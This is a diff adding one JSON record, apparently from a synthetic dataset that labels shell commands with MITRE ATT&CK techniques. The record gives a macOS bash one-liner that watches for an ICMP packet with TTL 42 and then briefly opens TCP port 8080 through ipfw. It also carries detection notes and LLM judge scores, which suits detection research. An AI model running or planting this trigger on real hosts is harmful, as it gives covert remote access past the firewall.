@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1205",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo bash -c 'tcpdump -ln -i en0 -c 1 \"icmp and ip[8] = 42\" >/dev/null && ipfw add 410 allow tcp from any to me 8080 in; sleep 45; ipfw delete 410'",
+  "explanation": "Uses a magic TTL value (42) on an ICMP echo as the covert signal; on detection, opens TCP/8080 via ipfw for 45 seconds. Requires elevated privileges.",
+  "rationale_steps": [
+    "Leverage non-standard TTL in an ICMP probe as a low-noise signal.",
+    "Temporarily permits access to a hidden service port when the signal is seen.",
+    "Detection: alert on ICMP with atypical TTLs and correlate with ipfw rule changes and short-lived port 8080 availability."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-fe1a2ad7-86e3957a",
+  "source_prompt_hash": "fe1a2ad7",
+  "timestamp_utc": "2025-09-30T06:07:36.671120Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quotes, correct separators, and valid tcpdump/ipfw syntax and redirection.",
+        "semantic_score": 4,
+        "semantic_justification": "It uses tcpdump to detect an ICMP packet with TTL 42 and conditionally opens TCP/8080 via ipfw for ~45 seconds, aligning with Traffic Signaling, but relies on legacy ipfw on modern macOS and does not strictly enforce ICMP echo type.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T16:04:09.828010Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, proper command separators, and correct syntax for all tools involved.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the described MITRE ATT&CK technique and its explanation, using appropriate tools and arguments to implement a covert traffic signal and reactive firewall modification.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T16:04:24.322418Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.5,
+    "llm_average_score": 4.75,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
